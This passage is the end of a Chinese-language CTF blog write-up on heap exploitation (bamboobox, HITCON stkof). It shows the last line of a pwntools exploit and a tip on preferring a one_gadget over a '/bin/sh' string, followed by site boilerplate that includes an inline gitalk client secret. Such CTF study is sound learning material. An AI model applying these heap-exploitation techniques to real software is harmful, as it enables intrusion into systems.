class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里binsh需要malloc一个新的块才有用，所以我一般都是用onegadget啦~</p>
<p><img src="/blog_img/1563951178238.png" alt="1563951178238"></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/statics/chengdu.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
                    <p>V1ct0r</p>
                    <span>Where there is a will,there is a way！</span>
                    <dl>
                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">92 <p>Articles</p></a></li>
                    <li><a href="/categories">20 <p>Categories</p></a></li>
                    <li><a href="/tags">82 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、源码介绍："><span class="toc-number">1.</span> <span class="toc-text">一、源码介绍：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、保护机制探索"><span class="toc-number">2.</span> <span class="toc-text">二、保护机制探索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB11-bamboobox"><span class="toc-number">3.</span> <span class="toc-text">LAB11:bamboobox</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2014-HITCON-stkof"><span class="toc-number"></span> <span class="toc-text">2014 HITCON stkof</span></a>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2021
        <span class="gradient-text">
            V1ct0r
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    
<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">

    
<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>



<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/obsidian.js"></script>
<script src="/js/jquery.truncate.js"></script>
<script src="/js/search.js"></script>


<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>


<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>


<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>


<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>


    
<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>




    
<script src="/js/busuanzi.min.js"></script>

    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>



<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">


<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
